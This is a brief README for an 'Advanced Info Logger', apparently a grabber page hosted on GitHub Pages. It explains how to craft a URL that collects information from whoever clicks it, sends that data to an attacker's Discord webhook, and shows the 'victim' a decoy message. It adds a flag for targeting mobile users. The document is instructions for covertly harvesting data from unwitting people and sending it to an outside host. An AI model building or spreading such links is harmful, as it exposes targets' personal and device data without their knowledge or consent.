# Advanced Info Logger

## Usage
To create a URL, format it like this:

submits.github.io/?(user id of who you want to ping when url is clicked)?(id of webhook)?(token of webhook)?(message victim will see upon loading page)

Optionally, add ?mobile on the end of the url if you are targetting someone on mobile (this is because some info only supports desktop browsers).
